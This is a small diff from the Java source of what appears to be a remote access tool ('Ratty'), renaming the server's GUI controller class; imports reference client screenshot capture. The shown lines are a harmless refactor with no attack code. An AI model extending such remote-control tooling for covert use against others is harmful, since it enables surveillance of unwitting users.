@@ -12,14 +12,14 @@ import de.sogomn.rat.packet.ScreenshotPacket;
 import de.sogomn.rat.server.ActiveServer;
 import de.sogomn.rat.server.IServerObserver;
 
-public final class ServerGuiController implements IServerObserver, IClientObserver, IGuiController {
+public final class RattyGuiController implements IServerObserver, IClientObserver, IGuiController {
 	
 	private RattyGui gui;
 	
 	private ArrayList<ServerClient> clients;
 	private long nextId;
 	
-	public ServerGuiController(final RattyGui gui) {
+	public RattyGuiController(final RattyGui gui) {
 		this.gui = gui;
 		
 		clients = new ArrayList<ServerClient>();
